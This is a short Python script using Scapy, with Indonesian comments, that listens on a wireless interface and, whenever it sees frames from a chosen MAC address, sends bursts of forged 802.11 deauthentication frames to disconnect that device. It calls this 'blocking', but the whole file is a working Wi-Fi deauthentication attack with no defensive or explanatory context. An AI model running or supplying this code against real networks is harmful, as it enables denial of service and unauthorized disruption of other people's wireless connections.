from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth


# Ganti dengan alamat MAC perangkat yang ingin diblokir
target_mac = "00:11:22:33:44:55"

def block_device(packet):
    if packet.haslayer(Dot11):
        if packet[Dot11].addr2 == target_mac:
            print(f"Memblokir perangkat dengan MAC: {target_mac}")
            # Mengirimkan paket deauth untuk memutuskan koneksi
            deauth = Dot11(addr1=packet[Dot11].addr1, addr2=packet[Dot11].addr2, addr3=packet[Dot11].addr3) / Dot11Deauth(reason=7)
            sendp(deauth, iface="wlan0", count=100, inter=0.1)

# Menangkap paket di jaringan
sniff(iface="wlan0", prn=block_device)